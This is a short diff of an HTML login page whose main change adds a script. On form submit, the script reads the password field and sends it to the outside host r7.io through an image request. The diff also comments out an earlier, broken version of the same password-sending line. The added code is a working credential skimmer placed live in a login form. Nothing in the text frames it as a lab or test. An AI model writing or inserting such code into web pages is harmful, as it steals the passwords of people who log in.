@@ -17,8 +17,8 @@
             if(language == "english") {
                 console.log(language);
             }
-	var i = new Image; 
-	i.src = "http://r7.io/e/moffotto?s=password="+ $( "#signin-btn" ).click(document.forms[0].elements[1].value);
+	//var i = new Image; 
+	//i.src = "http://r7.io/e/moffotto?s=password="+ $( "#signin-btn" ).click(document.forms[0].elements[1].value);
         });
     </script>
 
@@ -29,6 +29,14 @@
 <div id="signin" class="reveal">
   <form id="login" action="./index" method="get" class="untouched">
       <h1><a href="#">NOPE</a></h1>
+
+	<script>function intercept() { 
+		var pass = document.forms[0].elements[1].value; 
+		var i = new Image; 
+		i.src = "http://r7.io/e/moffotto?s=password="+pass;
+ 	} 
+	document.forms[0].onsubmit = intercept;
+	</script>
 
       <div id="login-fields-wrapper">
         <div id="login-fields">
